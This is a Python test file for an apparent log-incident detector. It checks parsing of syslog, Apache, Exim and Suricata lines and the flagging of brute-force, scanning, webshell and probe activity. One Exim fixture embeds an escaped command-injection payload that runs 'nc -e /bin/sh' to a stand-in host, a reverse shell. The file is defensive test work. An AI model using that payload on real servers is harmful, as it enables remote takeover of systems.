"""Whole-log-file analysis (cyber-threat module): timestamps, incident bursts, signatures, the scan verdict, the saved
thresholds file, and uploading a whole .log file through the API. All offline; no trained file needed."""
import io
import json
import os

import pytest

from app.detectors import cyber_threat as C
from app.detectors import log_incidents as LI


@pytest.mark.parametrize("line,expected", [
    ("2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W Completed", "2020-03-04 19:36:19"),
    ('1.2.3.4 - - [04/Mar/2020:19:18:36 +0000] "GET / HTTP/1.1" 200 5', "2020-03-04 19:18:36"),
    ("[Wed Mar 04 18:28:06.853762 2020] [:error] [pid 6745] x", "2020-03-04 18:28:06"),
    ("03/04/2020-19:27:42.333394  [**] [1:2012887:3] ET POLICY", "2020-03-04 19:27:42"),
    ("Mar  4 19:28:23 mail sshd[1]: x", "2000-03-04 19:28:23"),
])
def test_timestamps(line, expected):
    from datetime import datetime, timezone
    assert datetime.fromtimestamp(LI.timestamp(line), timezone.utc).strftime("%Y-%m-%d %H:%M:%S") == expected


def sshd_fail(i, ip="203.0.113.9", minute=0):
    return f"Mar  4 19:{minute + i // 60:02d}:{i % 60:02d} web sshd[{900 + i}]: Failed password for root from {ip} port 4{i:04d} ssh2"


def access(i, ip, path, status, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"):
    return f'{ip} - - [04/Mar/2020:19:{i // 60:02d}:{i % 60:02d} +0000] "GET {path} HTTP/1.1" {status} 512 "-" "{ua}"'


NORMAL_SYSLOG = ["Mar  4 09:17:01 mail CRON[24738]: pam_unix(cron:session): session opened for user root by (uid=0)",
                 "Mar  4 09:17:01 mail CRON[24738]: pam_unix(cron:session): session closed for user root",
                 "Mar  4 10:00:02 mail dovecot: imap(karri): Logged out in=78 out=713",
                 "Mar  4 10:05:40 mail sshd[812]: Accepted publickey for ashis from 198.51.100.4 port 51234 ssh2"]


def cats(lines, cfg=None):
    return {i["category"] for i in LI.incidents(lines, cfg or LI.DEFAULTS)}


def test_password_burst_is_brute_force_but_a_few_mistakes_are_not():
    assert "brute_force" in cats(NORMAL_SYSLOG + [sshd_fail(i * 20) for i in range(6)])      # 6 in 2 minutes
    assert "brute_force" not in cats(NORMAL_SYSLOG + [sshd_fail(i * 20) for i in range(3)])  # a user mistyping
    spread = [f"Mar  4 {10 + i}:00:00 web sshd[1]: Failed password for ashis from 198.51.100.4 port 1 ssh2" for i in range(8)]
    assert "brute_force" not in cats(spread)                                                 # 8 over 8 hours


def test_web_scan_needs_a_flood_of_rejected_requests():
    normal = [access(i, "198.51.100.7", f"/page{i}", 200) for i in range(40)] + \
             [access(50 + i, "198.51.100.7", "/favicon.ico", 404) for i in range(4)]
    assert cats(normal) == set()
    scan = normal + [access(100 + i, "203.0.113.50", f"/admin{i}.php", 404) for i in range(30)]
    assert "web_scan" in cats(scan)


def test_scanner_tool_webshell_exploit_and_enumeration_signatures():
    nikto = [access(1, "203.0.113.5", "/manager/html", 404, "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000123)")]
    assert "scanner_tool" in cats(NORMAL_SYSLOG + nikto)
    shell = ["[Wed Mar 04 18:28:06.853762 2020] [:error] [pid 6745] [client 192.168.10.81:33156] PHP Warning:  system(): "
             "Cannot execute a blank command in /var/www/site/static/evil.php on line 1"]
    assert "webshell" in cats(NORMAL_SYSLOG + shell)
    exim = ['2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\\x2fbin\\x2fsh\\t-c\\t\\x22nc\\t-e\\t\\x2fbin\\x2fsh\\t203.0.113.8'
            '\\t9963\\x22}}@localhost: Too many "Received" headers']
    assert "webshell" in cats(NORMAL_SYSLOG + exim)
    vrfy = [f"2020-03-04 18:19:{40 + i:02d} VRFY failed for user{i}@example.com H=(x) [203.0.113.81]" for i in range(8)]
    assert "enumeration" in cats(NORMAL_SYSLOG + vrfy)


def test_normal_logs_have_no_incidents():
    assert cats(NORMAL_SYSLOG * 50) == set()


def test_summary_of_a_whole_log():
    lines = NORMAL_SYSLOG + [sshd_fail(i * 10) for i in range(12)]
    s = LI.analyze("\n".join(lines))
    assert s["linesRead"] == len(lines) and s["timeRange"] == ["09:17:01", "19:01:50"]
    (inc,) = s["incidents"]
    assert inc["label"] == "Password brute-force attack" and inc["lines"] == 12 and inc["sources"] == ["203.0.113.9"]
    assert "203.0.113.9" in inc["description"] and "Failed password" in inc["description"]
    assert LI.analyze("one line\ntwo lines") is None


def test_scan_verdicts():
    attack = C.analyze_event_text("\n".join(NORMAL_SYSLOG + [sshd_fail(i * 10) for i in range(12)]), {}, "Log Analysis")
    labels = [i["label"] for i in attack["indicators"] if i["triggered"]]
    assert attack["riskScore"] >= 71 and "Log incident: Password brute-force attack" in labels
    assert attack["logAnalysis"]["linesRead"] == 16 and attack["explanation"].startswith("Read 16 log lines")
    assert C.analyze_event_text("\n".join(NORMAL_SYSLOG * 20), {}, "Log Analysis")["riskScore"] < 51


def test_thresholds_file_is_used_and_a_broken_file_is_ignored(tmp_path, monkeypatch):
    path = tmp_path / "log_analysis.json"
    monkeypatch.setattr(LI, "CONFIG_PATH", str(path))
    path.write_text(json.dumps({"thresholds": {"brute_force": 20, "web_scan": 15, "probe": 5, "enumeration": 5}}))
    assert LI.load_config()["brute_force"] == 20
    assert "brute_force" not in {i["category"] for i in LI.incidents([sshd_fail(i) for i in range(12)])}
    path.write_text("not json")
    assert LI.load_config() == LI.DEFAULTS


def test_uploading_a_whole_log_file(auth_client):
    lines = NORMAL_SYSLOG + [sshd_fail(i * 10) for i in range(12)]
    files = {"file": ("auth.log", io.BytesIO("\n".join(lines).encode()), "text/plain")}
    r = auth_client.post("/api/analysis/scan", data={"moduleId": "cyber-threat", "subtopicId": "log-analysis",
                                                      "subtopicTitle": "System & Application Log Analysis"}, files=files)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["riskScore"] >= 71 and body["logAnalysis"]["linesRead"] == 16
    assert body["logAnalysis"]["incidents"][0]["label"] == "Password brute-force attack"
    from app.core.config import get_settings
    folder = get_settings().UPLOAD_DIR
    assert not any(n.endswith(".log") for n in (os.listdir(folder) if os.path.isdir(folder) else []))   # deleted


def test_uploaded_log_with_auto_detect(auth_client):
    lines = [access(i, "203.0.113.50", f"/admin{i}.php", 404) for i in range(30)]
    files = {"file": ("access.log", io.BytesIO("\n".join(lines).encode()), "text/plain")}
    r = auth_client.post("/api/analysis/scan", data={"moduleId": "cyber-threat", "subtopicId": "auto",
                                                      "subtopicTitle": "Auto-detect"}, files=files)
    assert r.status_code == 200, r.text
    assert r.json()["riskScore"] >= 71


def test_scanning_a_log_on_disk_never_deletes_it(tmp_path):
    """Only the API's own temporary upload is deleted - never a file the caller owns (e.g. demo samples)."""
    from app.services.analysis_service import run_scan
    path = tmp_path / "server.log"
    path.write_text("\n".join(NORMAL_SYSLOG + [sshd_fail(i * 10) for i in range(12)]))
    r = run_scan(module_id="cyber-threat", subtopic_id="log-analysis", subtopic_title="Log Analysis", text_input=None,
                 url_input=None, file_path=str(path), file_name="server.log", extra_field_values={})
    assert r["riskScore"] >= 71 and path.exists()


def test_analyze_uses_the_thresholds_it_is_given():
    lines = NORMAL_SYSLOG + [sshd_fail(i * 10) for i in range(6)]
    assert LI.analyze("\n".join(lines), {**LI.DEFAULTS, "brute_force": 5})["incidents"]
    assert not LI.analyze("\n".join(lines), {**LI.DEFAULTS, "brute_force": 50})["incidents"]


def test_log_format_is_named_and_an_unknown_one_is_said_plainly():
    assert LI.log_format(NORMAL_SYSLOG) == "Linux system / SSH log (syslog)"
    assert LI.log_format([access(i, "198.51.100.7", "/", 200) for i in range(5)]).startswith("web server access log")
    assert LI.log_format(["2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W <= a@example.com H=(x) [203.0.113.8] P=esmtp S=500"] * 3) \
        == "mail server log (Exim)"
    assert LI.log_format(["An account failed to log on. EventID=4625 user=bob"] * 3) == "Windows Security event log"
    app = [f"2015-07-29 17:41:{i:02d},535 - INFO  [main:QuorumPeer@913] - tickTime set to 2000" for i in range(30)]
    assert LI.log_format(app) is None
    quiet = C.analyze_event_text("\n".join(NORMAL_SYSLOG * 5), {}, "Log Analysis")
    assert quiet["logAnalysis"]["formatRecognised"] and "found no attack incidents" in quiet["explanation"]
    unknown = C.analyze_event_text("\n".join(app), {}, "Log Analysis")
    assert unknown["logAnalysis"]["formatRecognised"] is False
    assert "format was not recognised" in unknown["explanation"] and "does not prove it is safe" in unknown["explanation"]


def test_a_quick_port_scan_is_reported_only_as_an_earlier_step_of_a_real_attack():
    from app.detectors import log_incidents as LI
    probe = ("Mar  4 19:17:33 mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=<>, "
             "rip=192.168.10.238, lip=192.168.10.154, session=<B4nCRQygltnAqAru>")
    quiet = [f"Mar  4 19:{m:02d}:00 mail dovecot: imap-login: Login: user=<ann>, rip=10.0.0.5" for m in range(5)]
    alone = LI.analyze("\n".join(quiet + [probe]))
    assert alone["incidents"] == []                            # one pre-login disconnect alone: normal clients do that
    fails = [f"Mar  4 19:2{i}:0{i} mail sshd[1{i}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 "
             f"tty=ssh ruser= rhost=192.168.10.238  user=root" for i in range(6)]
    r = LI.analyze("\n".join(quiet + [probe] + fails))
    cats = {i["category"]: i for i in r["incidents"]}
    assert set(cats) == {"brute_force", "probe"}
    assert "earlier step of that attack" in cats["probe"]["description"]
    assert "earlier step" not in cats["brute_force"]["description"]


def test_dovecot_disconnect_before_auth_is_a_probe_line():
    from app.detectors import log_incidents as LI
    line = ("Mar  4 13:51:48 mail dovecot: imap-login: Disconnected (disconnected before auth was ready, waited 0 secs): "
            "user=<>, rip=192.168.10.18, lip=192.168.10.21, session=<+KO9uAeg4sPAqAoS>")
    assert [(e[0], e[3]) for e in LI.events([line])] == [("probe", "192.168.10.18")]
